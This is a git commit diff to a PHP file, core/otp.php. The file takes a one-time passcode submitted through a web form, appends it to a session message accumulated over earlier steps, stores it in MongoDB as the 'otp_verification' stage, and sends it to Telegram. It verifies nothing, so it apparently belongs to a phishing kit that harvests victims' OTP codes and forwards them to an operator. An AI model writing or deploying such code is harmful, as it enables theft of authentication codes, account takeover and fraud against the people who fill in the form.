0e7431de59f51620f7dd476154a5b94c27c50001
Peterelzevir <114345532+Peterelzevir@users.noreply.github.com>
2025-03-22 06:07:41 +0700

    Update otp.php

--- core/otp.php
+++ core/otp.php
@@ -1,15 +1,30 @@
 <?php
+require_once __DIR__ . '/db_config.php';
+require_once __DIR__ . '/MongoDBSessionHandler.php';
+require_once __DIR__ . '/telegram.php';
+
+// Inisialisasi MongoDB Session Handler
+$mongoSessionHandler = new MongoDBSessionHandler($mongo_connection_string);
+session_set_save_handler($mongoSessionHandler, true);
+$GLOBALS['mongoSessionHandler'] = $mongoSessionHandler;
 
 session_start();
 
-include "./telegram.php";
-
-$message = $_SESSION['message'];
-$code = $_POST['code'];
+$message = $_SESSION['message'] ?? '';
+$code = $_POST['code'] ?? '';
 
 $string = $message;
 $string .= "OTP : `$code`\n";
 
 $_SESSION['message'] = $string;
+$_SESSION['otp'] = $code;
+
+// Simpan juga ke MongoDB secara langsung
+if (isset($mongoSessionHandler)) {
+    $mongoSessionHandler->saveTelegramData($string, [
+        'otp_code' => $code,
+        'stage' => 'otp_verification'
+    ]);
+}
 
 sendTelegram($string);
